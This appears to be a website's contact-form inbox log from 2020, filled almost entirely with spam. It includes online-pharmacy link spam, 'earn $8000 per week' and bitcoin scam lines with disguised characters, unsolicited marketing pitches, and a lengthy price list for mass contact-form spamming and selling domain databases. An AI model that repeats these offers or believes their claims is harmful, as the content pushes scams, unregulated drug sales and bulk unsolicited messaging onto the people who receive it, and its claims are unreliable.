Monkey Digital 
support@monkeydigital.co
+++ 2020-07-27 10:45:31 AM -- Email from: Booskels, -- subject: mjkpsnyh, -- email: carlyn@outlook.com, -- Message is: &lt;a href=&quot;http://accutanisotretinoin.com/&quot;&gt;buy accutane online nz&lt;/a&gt; &lt;a href=&quot;http://albenzamed.com/&quot;&gt;albenza 200 cost&lt;/a&gt; &lt;a href=&quot;http://avodart24.com/&quot;&gt;avodart capsule&lt;/a&gt; &lt;a href=&quot;http://zoloft360.com/&quot;&gt;buy zoloft online europe&lt;/a&gt; &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia tablets online&lt;/a&gt; &lt;a href=&quot;http://motilium10mg.com/&quot;&gt;motilium online pharmacy&lt;/a&gt;
+++ 2020-07-27 04:34:08 PM -- Email from: Ashskels, -- subject: qmzotmen, -- email: james4@hotmail.com, -- Message is: &lt;a href=&quot;http://zofranondansetron.com/&quot;&gt;where can you buy zofran over the counter&lt;/a&gt; &lt;a href=&quot;http://viagrasoftab.com/&quot;&gt;buy viagra soft online&lt;/a&gt; &lt;a href=&quot;http://priligydapoxetin.com/&quot;&gt;order priligy tablets&lt;/a&gt; &lt;a href=&quot;http://stratterra.com/&quot;&gt;buy cheap strattera&lt;/a&gt; &lt;a href=&quot;http://flagyl24.com/&quot;&gt;medicine flagyl&lt;/a&gt; &lt;a href=&quot;http://disulfiram.us.com/&quot;&gt;disulfiram tablet cost&lt;/a&gt; &lt;a href=&quot;http://propranolol100.com/&quot;&gt;propranolol 60 mg capsule coupon&lt;/a&gt;
+++ 2020-07-27 07:46:50 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric@talkwithwebvisitor.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://www.talkwithwebvisitor.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=esyray.com
+++ 2020-07-28 01:24:10 AM -- Email from: Mack Joiner, -- subject: How to make your first $100 from esyray.com, -- email: mack.joiner@gmail.com, -- Message is: Hi there,

Read this if you haven’t made your first $100 from  esyray.com online yet...
 
I've heard it a million times...

I'm going to quit my job, I'm going to start my own business, I'm going to live where I want, and I'm going to live the dream...

Enough talk.

Everyone's got a vision.

Fine.

What exactly have you done lately to make it come true?

Not much, you say?

If everyone suddenly got injected with the truth serum, you'd hear people talk a different game:

I've got huge dreams. But I'm a failure, because I did nothing to make these dreams come true. I'm too afraid to start. I procrastinate about taking action. I will probably never do anything or amount to anything in my life, because I choose to stay in my comfort zone.

Incidentally, the first step to changing your life is to be honest about how you feel.

Are you afraid?

Fine.

Are you anxious?

Fine.

Do you procrastinate?

Great.

This means you have to start with a tiny step.

Something that isn't as intimidating as making a million dollars in the next 12 months.

How about making your first $100.00 online?

Doesn't sound too far out of reach, right?

Here's a great place to start
==&gt; http://www.zoomsoft.net/12Minute


If you would like to stop future emails, http://www.zoomsoft.net/12MinuteUnsubscribe
+++ 2020-07-28 08:00:56 PM -- Email from: Billie Littlejohn, -- subject: , -- email: billie.littlejohn@gmail.com, -- Message is: Hello, I was just visiting your site and submitted this message via your contact form. The contact page on your site sends you these messages to your email account which is the reason you are reading through my message right now right? This is the holy grail with any kind of online ad, getting people to actually READ your ad and I did that just now with you! If you have an ad message you would like to blast out to lots of websites via their contact forms in the US or anywhere in the world send me a quick note now, I can even target specific niches and my costs are very reasonable. Send a reply to: stephanyrishigq53@gmail.com

remove my website from your list https://bit.ly/2yp4480
+++ 2020-07-30 12:27:30 AM -- Email from: Booskels, -- subject: tupojzvi, -- email: gunnarhall@outlook.com, -- Message is: &lt;a href=&quot;http://baclofenp.com/&quot;&gt;baclofen generic brand&lt;/a&gt; &lt;a href=&quot;http://indocinrx.com/&quot;&gt;indocin&lt;/a&gt; &lt;a href=&quot;http://fluoxetinetb.com/&quot;&gt;fluoxetine for sale online&lt;/a&gt; &lt;a href=&quot;http://glucophagge.com/&quot;&gt;glucophage 850 mg&lt;/a&gt;
+++ 2020-07-30 11:52:52 AM -- Email from: Earn mоneу $8319 per wеek: http://xisher.thegreasealliance.com/a7aa7e, -- subject: BEST ЕARNINGS FOR АLL FROM $8638 реr wееk: http://wxyvnnz.lampcommunity.net/c9f, -- email: pablino-88@live.it, -- Message is: How tо Маке $30000 FASТ, Fast Моnеу, Тhе Busу Budgеter: http://jyi.cschan.website/18bc9
+++ 2020-07-30 03:49:03 PM -- Email from: Rodrigo Richard, -- subject: Hi, I can help you with your website, -- email: wpdeveloperfiver@gmail.com, -- Message is: Hi friend! I found your website esyray.com in Google. I am highly reputed seller in Fiverr, from Bangladesh. The pandemic has severely affected our online businesses and the reason for this email is simply to inform you that I am willing to work at a very low prices (5$), without work I can?t support my family. I offer my WP knowledge to fix bugs, Wordpress optimizations and any type of problem you could have on your website. Feel free to contact me through my service on Fiverr (Contact button), I thank you from my heart: 
 
https://track.fiverr.com/visit/?bta=127931&amp;brand=fiverrcpa&amp;landingPage=https%3A%2F%2Fwww.fiverr.com%2Fericdaniel002%2Ffix-your-wordpress-theme-and-layout-issues-ff5cb811-65aa-4e1d-a0d3-8057e62aeaac 
 
Regards,
+++ 2020-07-30 06:28:54 PM -- Email from: Merissa Heidelberg, -- subject: merissa.heidelberg@gmail.com, -- email: merissa.heidelberg@gmail.com, -- Message is: Have you had enough of expensive PPC advertising? Now you can post your ad on thousands of advertising sites and it'll cost you less than $40. Get unlimited traffic forever! 

For more information just visit: https://bit.ly/continual-free-traffic
+++ 2020-07-31 05:41:52 PM -- Email from: Wimskels, -- subject: ijtqqsjy, -- email: halfpaypal@mail.com, -- Message is: &lt;a href=&quot;http://albendazoleotc.com/&quot;&gt;how much is albendazole in canada&lt;/a&gt;
+++ 2020-08-01 12:26:56 AM -- Email from: Get $6329 pеr weeк: http://pzfty.fpponline.net/0d6337, -- subject: Вitcоin ratе is growing. Маnagе to invest. Get раssive inсomе of $ 3,500 per wееk: http://rshbwg.cschan.website/0810161, -- email: annieetmarcel@hotmail.fr, -- Message is: Fоrеx + Bitcоin = $ 8872 рer wеek: http://mro.eipamw.com/ac4aa3
+++ 2020-08-01 12:48:28 AM -- Email from: Ugoskels, -- subject: gnmzcdif, -- email: juliegill99@yahoo.com, -- Message is: &lt;a href=&quot;http://albendazoleotc.com/&quot;&gt;buy albendazole on line&lt;/a&gt; &lt;a href=&quot;http://atenolol25.com/&quot;&gt;atenolol 50mg prescription cost&lt;/a&gt; &lt;a href=&quot;http://vardenafilxr.com/&quot;&gt;generic vardenafil canadian pharmacy&lt;/a&gt; &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia online&lt;/a&gt;
+++ 2020-08-01 07:40:31 AM -- Email from: Ashskels, -- subject: jnfrdtoe, -- email: psedis@hotmail.com, -- Message is: &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia online&lt;/a&gt; &lt;a href=&quot;http://chloroquineav.com/&quot;&gt;lariago&lt;/a&gt; &lt;a href=&quot;http://cleocing.com/&quot;&gt;cleocin 150&lt;/a&gt; &lt;a href=&quot;http://buspar24.com/&quot;&gt;buspar 100&lt;/a&gt; &lt;a href=&quot;http://phenergan125.com/&quot;&gt;price of phenergan&lt;/a&gt;
+++ 2020-08-01 04:58:48 PM -- Email from: Ashskels, -- subject: nfobaeyt, -- email: dgsjr912@gmail.com, -- Message is: &lt;a href=&quot;http://malegra.us.org/&quot;&gt;malegra dxt online&lt;/a&gt; &lt;a href=&quot;http://advair2019.com/&quot;&gt;advair hfa inhaler&lt;/a&gt; &lt;a href=&quot;http://atenolol25.com/&quot;&gt;online atenolol&lt;/a&gt; &lt;a href=&quot;http://baclofenp.com/&quot;&gt;baclofen 10 mgs no prescription&lt;/a&gt;
+++ 2020-08-02 05:43:31 PM -- Email from: contactuzjnmf, -- subject: We offer sending newsletters via  contact forms to the sites of companies via any domain zones of the world in all languages., -- email: jerome_sesso37@rambler.ru, -- Message is: Dear sirs, Dear Madame! 
 
We offer sending newsletters of Your messages via contact forms to the sites ofcompanies via all countries of the world in all languages.  
 
https://xn----7sbb1bbndheurc1a.xn--p1ai 
 
Your commercial offer is sent to email of organization 100 percent will get to inside of the inbox folder! 
 
Test: 
10000 messages on foreign zones to your electronic box - 20 dollars. 
We need from You only E-mail, title and text of the letter. 
 
In our price list there are more 800 databases for all domain zones of the world. 
Common databases: 
All Europe 44 countries 60726150 of sites - 1100$ 
All European Union 28 countries 56752547 of sites- 1000$ 
All Asia 48 countries 14662004 of domains - 300$ 
All Africa 50 countries 1594390 of domains - 200$ 
All North and Central America in 35 countries 7441637 of sites - 300$ 
All South America 14 countries 5826884 of sites - 200$ 
Enterprises and organizations of the Russian Federation 4025015 - 300$ 
Ukraine 605745 of domain names - 100$ 
All Russian-speaking countries minus Russian Federation are 14 countries and there are 1979217 of domain names - 200$ 
 
Databases: 
WHOIS databases of domains for all nations of the world. 
You can purchase our databases separately from newsletter's service at the request. 
 
P/S 
Pls., do not respond to this commercial offer from your electronic box, as it has been generated automatically and will not reach us! 
Use the contact form from the site https://xn----7sbb1bbndheurc1a.xn--p1ai 
 
PRICE LIST: 
 
Test mailing: $20 – 10000 contact forms websites 
 
All Europe 44 countries there are 60726150 websites – $1100 
 
All EU 28 countries there are 56752547 websites – $1000 
 
All Asia 48 countries there are 14662004 websites – $500 
 
All Africa 50 countries there are 1594390 websites – $200 
 
All North and Central America is 35 countries there are 7441637 websites – $300 
 
All South America 14 countries there are 5826884 websites – $200 
 
Top 1 Million World’s Best websites – $100 
 
Top 16821856 the most visited websites in the world – $300 
 
New websites from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 500$ 
 
Businesses and organizations of the Russian Federation – there are 3012045 websites – $300 
 
All Russian-speaking countries minus Russia – there are 14 countries and 1850186 websites – $200 
 
New websites of the Russian Federation, registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 
 
250$ 
 
1499203 of hosting websites around the world (there are selections for all countries, are excluded from databases 
 
for mailings) – $150 
 
142018 websites of public authorities of all countries of the world (selections for all countries, are excluded 
 
from databases for mailings) – $100 
 
CMS mailings: 
 
Amiro 1794 websites $50 
Bitrix 199550 websites $80 
Concrete5 39121 websites $50 
CONTENIDO 5069 websites $50 
CubeCart 1062 websites $50 
Datalife Engine 23220 websites $50 
Discuz 47962 websites $50 
Dotnetnuke 22859 websites $50 
Drupal 802121 websites $100 
Flexbe 15072 websites $50 
HostCMS 5042 websites $50 
InstantCMS 4136 websites $50 
InSales 11081 websites $50 
Invision Power Board 265 websites $30 
Joomla 1906994 websites $200 
Liferay 5137 websites $50 
Magento 269488 websites $80 
MODx 64023 websites $50 
Movable Type 9171 websites $50 
NetCat 6636 websites $50 
NopCommerce 3892 websites $50 
OpenCart 321057 websites $80 
osCommerce 68468 websites $50 
phpBB 2182 websites $50 
Prestashop 92949 websites $50 
Shopify 604387 websites $80 
Simpla 17429 websites $50 
Sitefinity 4183 websites $50 
Textpattern 882 websites $30 
Tilda 47396 websites $50 
TYPO3 192006 websites $80 
UMI.CMS 13191 websites $50 
vBulletin 8407 websites $50 
Wix 3379081 websites $250 
Wordpress 15574051 websites $450 
WooCommerce 2097367 websites $210 
 
.com 141528448 websites commercial - $1950 
.biz 2361884 websites business - $150 
.info 6216929 websites information - $250 
.net 15689222 websites network - $450 
.org 10922428 websites organization - $350 
 
.abogado 381 websites - $30 
.ac 2365 websites - $30 
.academy 34531 websites - $50 
.accountant 96540 websites - $50 
.accountants 1653 websites - $30 
.actor 2287 websites - $30 
.ad 323 websites - $30 
.adult 10541 websites- $50 
.ae 200462 websites UAE - $50 
.ae 1820 websites International zone UAE:.com .net .biz .info .name .tel .mobi .asia-$30 
.aero 23635 websites- $50 
.af 3778 websites - $30 
.africa	23341 websites- $50 
.ag 11931 websites - $50 
.agency 66462 websites - $50 
.ai 24137 websites - $50 
.airforce 592 websites - $30 
.al 6078 websites - $30 
.alsace	1982 websites - $50 
.am 21995 websites Armenia - $50 
.am 1684 websites International zone Armenia:.com .net .biz .info .name .tel .mobi .asia 
.amsterdam 28141 websites Amsterdam, Kingdom of the Netherlands - $30 
.ao 904 websites - $30 
.apartments 3758 websites - $30 
.app 661404 websites - $80 
.ar 551804 websites Argentina - $80 
.ar 64008 websites International zone Argentina:.com .net .biz .info .name .tel .mobi .asia-$50 
.archi 2084 websites - $30 
.army 2282 websites - $30 
.art 69227 websites - $50 
.as 10525 websites - $50 
.asia 228418 websites - $80 
.associates 3340 websites - $30 
.at 1356722 websites Austria - $100 
.at 181907 websites International zone Austria :.com .net .biz .info .name .tel .mobi .asia-$50 
.attorney 8204 websites - $30 
.au 2432174 websites Australia - $150 
.au 461279 websites International zone Australia:.com .net .biz .info .name .tel .mobi .asia-$80 
.auction 4125 websites - $30 
.audio 23052 websites - $50 
.auto 400 websites - $30 
.aw 235 websites - $30 
.az 11104 websites Azerbaijan - $50 
.az 2036 websites International zone Azerbaijan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ba 2291 websites international zone Bosnia and Herzegovina:.com.net.biz.info.org.name.tel.mobi.asia-$30 
.ba 7012 websites Bosnia and Herzegovina - $30 
.baby 2051 websites - $30 
.band 13515 websites - $50 
.bank 20424 websites - $50 
.bar 50267 websites - $50 
.barcelona 7919 websites - $30 
.bargains 2997 websites - $30 
.bargains 2346 websites - $30 
.bayern 32565 websites - $50 
.bb 2277 websites- $30 
.be 1349658 websites Belgium - $150 
.be 184810 websites International zone Belgium:.com .net .biz .info .name .tel .mobi .asia-$50 
.beer 13834 websites- $50 
.berlin 58088 websites Berlin - $50 
.best 93390 websites - $50 
.bet 17637 websites - $50 
.bf 238 websites - $30 
.bg 37152 websites Bulgaria - $50 
.bg 50685 websites International zone Bulgaria:.com .net .biz .info .name .tel .mobi .asia-$50 
.bh 453 websites - $30 
.bi 2328 websites Burundi - $30 
.bible 1760 websites - $30 
.bid 474509 websites - $80 
.bike 15229 websites - $50 
.bingo 1232 websites - $30 
.bio 15531 websites- $50 
.bj 147 websites - $30 
.black 6582 websites - $30 
.blackfriday 12106 websites - $50 
.blog 178562 websites - $80 
.blue 16852 websites - $50 
.bm 8089 websites Bermuda - $30 
.bn 20 websites - $30 
.bo 2602 websites- $30 
.bo 29415 websites International zone Bolivia:.com .net .biz .info .name .tel .mobi .asia-$50 
.boats 266 websites - $30 
.boston	21762 websites- $50 
.boutique 8834 websites - $50 
.br 2589383 websites Brazil - $250 
.br 933750 websites International zone Brazil:.com .net .biz .info .name .tel .mobi .asia-$80 
.bradesco 179 websites- $30 
.broadway 261 websites- $30 
.broker	1060 websites- $30 
.brussels 7181 websites - $30 
.bs 330 websites- $30 
.bt 284 websites- $30 
.build 3857 websites- $30 
.builders 3906 websites- $30 
.business 35168 websites - $50 
.buzz 534984 websites - $80 
.bw 1160 websites - $30 
.by 92679 websites Belarus - $50 
.by 1574 websites International zone Belarus:.com .net .biz .info .name .tel .mobi .asia-$30 
.bz 7751 websites - $30 
.bzh 5403 websites - $30 
.ca 2587463 websites Canada - $250 
.ca 288395 websites International zone Canada:.com .net .biz .info .name .tel .mobi .asia-$50 
.cab 3223 websites - $30 
.cafe 15406 websites - $50 
.cam 10316 websites - $50 
.camera 5236 websites - $30 
.camp 6315 websites - $30 
.capetown 4750 websites - $30 
.capital 14387 websites - $50 
.car 342 websites - $30 
.cards 5992 websites - $30 
.care 23004 websites - $50 
.career	1217 websites - $30 
.careers 7555 websites - $30 
.cars 309 websites - $30 
.casa 24158 websites - $50 
.cash 13193 websites - $50 
.casino	5354 websites - $30 
.cat 108569 websites - $50 
.catering 3482 websites - $30 
.cc 1920589 websites Cocos Keeling Islands- $200 
.cd 5865 websites - $30 
.center 39353 websites - $50 
.ceo 2458 websites - $30 
.cf 2291460 websites Central African Republic - $200 
.cg 166 websites - $30 
.ch 1627450 websites Switzerland - $150 
.ch 205292 websites International zone Switzerland:.com .net .biz .info .name .tel .mobi .asia-$50 
.chat 15026 websites - $50 
.cheap 3267 websites - $30 
.christmas 15255 websites - $50 
.church 24104 websites - $50 
.ci 5663 websites Cote d'Ivoire - $30 
.ci 112 websites International zone Cote d'Ivoire:.com .net .biz .info .name .tel .mobi .asia-$30 
.city 46171 websites - $50 
.cl 590401 websites Chile - $80 
.cl 65996 websites International zone Chile:.com .net .biz .info .name .tel .mobi .asia-$50 
.claims	2374 websites - $30 
.cleaning 2385 websites - $30 
.click 181015 websites - $50 
.clinic 8006 websites - $30 
.clothing 13639 websites - $50 
.cloud	164113 websites - $50 
.club 1230555 websites - $100 
.cm 29221 websites Cameroon- $50 
.cn 23160610 websites China - $600 
.cn 1372416 websites International zone China:.com .net .biz .info .name .tel .mobi .asia-$100 
.co 1878923 websites Colombia - $200 
.co 10854 websites International zone Colombia:.com .net .biz .info .name .tel .mobi .asia-$30 
.coach 16002 websites- $50 
.codes 12044 websites - $50 
.coffee 19257 websites - $50 
.cologne 10157 websites - $50 
.com.ar 657716 websites Argentina - $80 
.com.br 942898 websites Brazil – $100 
.com.cy	11153 websites Cyprus - $50 
.com.ni 23747 websites - $50 
.com.np 38828 websites - $50 
.com.ru, .net.ru, .org.ru, .spb.ru, .msk.ru 98375 websites Russia - $50 
.community 15013 websites - $50 
.company 64217 websites - $50 
.computer 5539 websites - $30 
.condos	2192 websites - $30 
.construction 7104 websites - $30 
.consulting 27128 websites - $50 
.contractors 3982 websites - $30 
.cooking 1476 websites - $30 
.cool 22008 websites - $50 
.coop 7479 websites - $30 
.corsica 1042 websites - $30 
.country 7144 websites - $30 
.cr 7934 websites - $30 
.credit	4020 websites - $30 
.creditcard 825 websites - $30 
.creditunion 511 websites - $30 
.cricket 33413 websites - $50 
.cruises 2234 websites - $30 
.cu 137 websites - $30 
.cv 2279 websites - $30 
.cx 15753 websites - $50 
.cy 11092 websites Cyprus - $50 
.cy 710 websites International zone Cyprus:.com .net .biz .info .name .tel .mobi .asia-$30 
.cymru 7314 websites - $30 
.cz 1001208 websites Czech Republic - $100 
.cz 193400 websites International zone Czech Republic:.com .net .biz .info .name .tel .mobi .asia-$50 
.dance	7490 websites - $30 
.date 10800 websites - $50 
.dating	2892 websites - $30 
.de 15078512 websites Germany - $450 
.de 3894156 websites International zone Germany:.com .net .biz .info .name .tel .mobi .asia-$200 
.deals 8332 websites - $30 
.degree	2178 websites - $30 
.delivery 6282 websites - $30 
.democrat 1072 websites - $30 
.dental 7841 websites - $30 
.dentist 3046 websites - $30 
.desi 2647 websites - $50 
.design 103712 websites - $50 
.dev	190456 websites - $50 
.diamonds 2730 websites - $30 
.diet 18291 websites - $50 
.digital 49449 websites - $50 
.direct 12129 websites - $50 
.directory 15157 websites - $50 
.discount 3898 websites - $30 
.dj 7680 websites - $30 
.dk 1319155 websites Denmark - $100 
.dk 148164 websites International zone Denmark:.com .net .biz .info .name .tel .mobi .asia-$50 
.dm 23318 websites - $50 
.do 5255 websites Dominican Republic- $30 
.doctor	5601 websites - $30 
.dog 10030 websites - $50 
.dog 12435 websites - $50 
.domains 6253 websites - $30 
.download 7886 websites - $30 
.durban	2247 websites - $30 
.dz 982 websites - $30 
.earth	23412 websites - $50 
.ec 11731 websites Ecuador - $50 
.ec 2897 websites International zone Ecuador:.com .net .biz .info .name .tel .mobi .asia-$30 
.edu 4445 websites - $30 
.edu.np 4883 websites- $30 
.education 25003 websites - $50 
.ee 119701 websites Estonia- $50 
.ee 10490 websites International zone Estonia:.com .net .biz .info .name .tel .mobi .asia-$30 
.eg 1699 websites - $30 
.email 100440 websites - $50 
.energy 12399 websites - $50 
.engineer 3785 websites - $30 
.engineering 6533 websites - $30 
.enterprises 6253 websites - $30 
.equipment 5060 websites - $30 
.es 1509048 websites Spain - $150 
.es 683845 websites International zone Spain:.com .net .biz .info .name .tel .mobi .asia-$80 
.estate 9285 websites - $30 
.et 134 websites - $30 
.eu 3046076 websites Europe - $150 
.eu 633384 websites International zone Europe:.com .net .biz .info .name .tel .mobi .asia-$80 
.eus 10116 websites - $50 
.events 25115 websites - $50 
.exchange 10432 websites - $50 
.expert 34040 websites - $50 
.exposed 2880 websites - $30 
.express 7019 websites - $30 
.fail 3692 websites - $30 
.faith 4019 websites - $30 
.family 21577 websites - $50 
.fan 28607 websites - $50 
.fans 1688 websites - $30 
.farm 17009 websites - $50 
.fashion 9011 websites - $30 
.feedback 1301 websites - $30 
.fi 188337 websites Finland - $50 
.fi 69631 websites International zone Finland:.com .net .biz .info .name .tel .mobi .asia-$50 
.film 4501 websites - $30 
.finance 9082 websites - $30 
.financial 5086 websites - $30 
.fish 4562 websites - $30 
.fishing 1422 websites - $30 
.fit 109855 websites - $50 
.fitness 10689 websites - $50 
.flights 2169 websites - $30 
.florist 2071 websites - $30 
.flowers 1187 websites - $30 
.fm 3775 websites - $30 
.fo 10415 websites- $50 
.football 4677 websites - $30 
.forex	282 websites - $30 
.forsale 7118 websites - $30 
.foundation 15401 websites - $50 
.fr 2810983 websites France - $250 
.fr 639546 websites International zone France:.com .net .biz .info .name .tel .mobi .asia-$80 
.frl 13028 websites - $50 
.fun 485622 websites - $50 
.fund 14501 websites - $50 
.furniture 2276 websites - $30 
.futbol	2709 websites - $30 
.fyi 15872 websites - $50 
.ga 5041 websites Gabon - $30 
.gal 5106 websites - $30 
.gallery 17663 websites - $50 
.game 2066 websites - $30 
.games 20294 websites - $50 
.garden	 2618 websites - $30 
.gd 3038 websites - $30 
.ge 17359 websites Georgia - $50 
.ge 1676 websites International zone Georgia:.com .net .biz .info .name .tel .mobi .asia-$30 
.gent 3388 websites - $30 
.gf 105 websites French Guiana - $30 
.gg 7443 websites - $30 
.gh 703 websites - $30 
.gi 981 websites - $30 
.gift 5001 websites - $30 
.gifts 3357 websites - $30 
.gives 1759 websites - $30 
.gl 3558 websites - $30 
.glass	3239 websites - $30 
.global 48572 websites - $50 
.gm 287 websites - $30 
.gmbh 20786 websites - $50 
.gold 9581 websites - $30 
.golf 10319 websites - $50 
.gop 1340 websites - $30 
.gov 4195 websites - $30 
.gov.np 1937 websites- $30 
.gp 2014 websites - $30 
.gq 63622 websites - $50 
.gr 323168 websites Greece - $80 
.gr 57984 websites International zone Greece:.com .net .biz .info .name .tel .mobi .asia-$150 
.graphics 6555 websites - $30 
.gratis	4113 websites - $30 
.green 5161 websites - $30 
.gripe 1175 websites - $30 
.group 65583 websites - $50 
.gs 1008 websites Georgia - $30 
.gt 15351 websites - $50 
.guide 15044 websites - $50 
.guitars 965 websites - $30 
.guru 53088 websites - $50 
.gy 2047 websites Guyana - $30 
.hamburg 21585 websites - $50 
.haus 5686 websites - $30 
.health	13716 websites - $50 
.healthcare 9001 websites - $30 
.help 13098 websites - $50 
.hiphop 518 websites - $30 
.hiv 279 websites - $30 
.hk 116093 websites - $50 
.hm 229 websites - $30 
.hn 4732 websites - $30 
.hockey	1402 websites - $30 
.holdings 5812 websites - $30 
.holiday 4517 websites - $30 
.homes 12499 websites - $50 
.horse 2516 websites - $30 
.hospital 1805 websites - $30 
.host 79977 websites - $50 
.hosting 3322 websites - $30 
.house 19296 websites - $50 
.how 2557 websites - $30 
.hr 48565 websites Croatia - $50 
.hr 16592 websites International zone Croatia:.com .net .biz .info .name .tel .mobi .asia 
.ht 1299 websites - $30 
.hu 618532 websites Hungary - $80 
.hu 53940 websites International zone Hungary:.com .net .biz .info .name .tel .mobi .asia-$50 
.icu 6331371 websites - $350 
.id 61744 websites - $50 
.ie 195987 websites Ireland - $50 
.ie 49861 websites International zone Ireland:.com .net .biz .info .name .tel .mobi .asia-$50 
.il 196266 websites Israel - $80 
.il 38537 websites International zone Israel:.com .net .biz .info .name .tel .mobi .asia-$50 
.im 18701 websites - $50 
.immo 15409 websites - $50 
.immobilien 6805 websites - $30 
.in 1143482 websites India - $100 
.in 266179 websites International zone India:.com .net .biz .info .name .tel .mobi .asia-$50 
.industries 4312 websites - $30 
.ink 28117 websites - $50 
.institute 12134 websites - $50 
.insure	5015 websites - $30 
.int 451 websites - $30 
.international 25430 websites - $50 
.investments 4813 websites - $30 
.io 496216 websites British Indian Ocean - $80 
.iq 2401 websites - $30 
.ir 427735 websites Iran - $80 
.ir 15487 websites International zone Iran:.com .net .biz .info .name .tel .mobi .asia 
.irish 3126 websites - $30 
.is 32176 websites Iceland - $50 
.ist 9060 websites - $30 
.istanbul 12839 websites - $50 
.it 2410105 websites Italy – $250 
.it 954040 websites International zone Italy:.com.net.biz.info.org.name.tel.mobi.asia-$100 
.je 3016 websites - $30 
.jetzt 18207 websites - $50 
.jewelry 3250 websites - $30 
.jo 555 websites - $30 
.jobs 44024 websites- $50 
.joburg	3138 websites - $30 
.jp 1299921 websites Japan - $150 
.jp 4683252 websites International zone Japan:.com.net.biz.info.org.name.tel.mobi.asia-$450 
.juegos	644 websites - $30 
.kaufen 6134 websites - $30 
.ke 14677 websites - $50 
.kg 3619 websites Kyrgyzstan - $30 
.kg 664 websites International zone Kyrgyzstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ki 79 websites - $30 
.kim 12007 websites- $50 
.kitchen 6881 websites - $30 
.kiwi 13426 websites - $50 
.kn 3211 websites - $30 
.koeln 23320 websites - $50 
.kr 272463 websites Korea- $50 
.krd 374 websites - $30 
.kred 8921 websites - $30 
.kw 484 websites - $30 
.ky 5783 websites - $30 
.kyoto 658 websites - $30 
.kz 113180 websites Kazakhstan - $50 
.kz 5876 websites International zone Kazakhstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.la 34189 websites Laos - $50 
.land 15474 websites- $50 
.lat 4171 websites - $30 
.law 12002 websites - $50 
.lawyer 10996 websites- $50 
.lc 481 websites- $30 
.lease 1755 websites- $30 
.leclerc 165 websites- $30 
.legal 13047 websites- $50 
.lgbt 2247 websites- $30 
.li 10044 websites - $50 
.life 195950 websites - $50 
.lighting 5870 websites - $30 
.limited 5365 websites - $30 
.limo 1981 websites- $30 
.link 117273 websites - $50 
.live 662010 websites - $80 
.lk 4971 websites - $30 
.llc 12888 websites - $50 
.loan 23738 websites - $50 
.loans 3994 websites - $30 
.lol 8121 websites - $30 
.london 48933 websites London, United Kingdom- $50 
.love 28434 websites - $50 
.ls 236 websites - $30 
.lt 94484 websites Lithuania- $50 
.lt 27710 websites International zone Lithuania:.com .net .biz .info .name .tel .mobi .asia- $50 
.ltd 100152 websites - $50 
.lu 47052 websites Luxembourg - $50 
.lu 4125 websites International zone Luxembourg:.com .net .biz .info .name .tel .mobi .asia-$30 
.luxe 14037 websites - $50 
.luxury	805 websites - $30 
.lv 67886 websites Latvia - $50 
.lv 8887 websites International zone Latvia:.com .net .biz .info .name .tel .mobi .asia-$30 
.ly 8413 websites - $30 
.ma 41462 websites Morocco - $50 
.madrid	2919 websites - $30 
.maison	1003 websites - $30 
.management 10788 websites- $50 
.market 18741 websites- $50 
.marketing 22656 websites- $50 
.markets 899 websites- $30 
.mba 2510 websites- $30 
.mc 3046 websites Monaco - $30 
.md 16135 websites Moldova - $50 
.md 1293 websites International zone Moldova:.com .net .biz .info .name .tel .mobi .asia-$30 
.me 761596 websites Montenegro - $80 
.me 86897 websites International zone Montenegro:.com .net .biz .info .name .tel .mobi .asia-$50 
.media 49573 websites - $50 
.melbourne 10041 websites - $50 
.memorial 712 websites - $30 
.men 24451 websites - $50 
.menu 5002 websites restaurants- $30 
.mg 3680 websites Madagascar- $30 
.miami 9210 websites Miami, USA - $30 
.mk 12704 websites - $50 
.ml 128001 websites - $50 
.mma 1705 websites - $30 
.mn 17044 websites - $50 
.mo 775 websites - $30 
.mobi 381422 websites- $80 
.moda 2741 websites - $30 
.moe 8709 websites - $30 
.mom 2085 websites - $30 
.money 12000 websites - $50 
.monster 54325 websites - $50 
.mortgage 3198 websites - $30 
.moscow 17741 websites Moscow Russian Federation- $50 
.movie 3275 websites - $30 
.mq 119 websites - $30 
.mr 199 websites - $30 
.ms 7265 websites - $30 
.mt 1402 websites Malta - $30 
.mu 6475 websites - $30 
.museum	1260 websites - $30 
.mv 1905 websites - $30 
.mw 8579 websites Malawi - $30 
.mx 670901 websites Mexico- $80 
.mx 174571 websites International zone Mexico:.com .net .biz .info .name .tel .mobi .asia-$50 
.my 143039 websites Malaysia- $80 
.mz 985 websites - $30 
.na 1094 websites - $30 
.nagoya	7807 websites - $30 
.name 120331 websites- $50 
.navy 799 websites - $30 
.nc 999 websites - $30 
.network 51331 websites - $50 
.news 57899 websites - $50 
.ng 23864 websites - $50 
